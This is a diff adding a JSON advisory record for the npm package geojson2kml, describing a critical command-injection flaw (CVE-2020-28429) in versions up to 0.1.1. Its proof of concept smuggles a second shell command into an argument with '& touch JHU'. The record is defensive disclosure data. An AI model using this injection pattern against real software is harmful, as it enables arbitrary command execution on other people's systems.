@@ -1,0 +1,26 @@
+{
+  "name": "geojson2kml",
+  "lastUpdated": "2026-01-31T15:05:26.294Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-w83x-fp72-p9qc",
+      "title": "Command Injection in geojson2kml",
+      "description": "All versions up to and including version 0.1.1 of package geojson2kml are vulnerable to Command Injection via the index.js file. \n\n### PoC: \n```js\nvar a =require(\"geojson2kml\"); \na(\"./\",\"& touch JHU\",function(){})\n```",
+      "severity": "critical",
+      "url": "https://github.com/advisories/GHSA-w83x-fp72-p9qc",
+      "publishedAt": "2021-05-10T15:59:33Z",
+      "modifiedAt": "2023-09-06T23:00:08Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-w83x-fp72-p9qc"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2020-28429"
+        }
+      ],
+      "affectedRange": "<= 0.1.1"
+    }
+  ]
+}
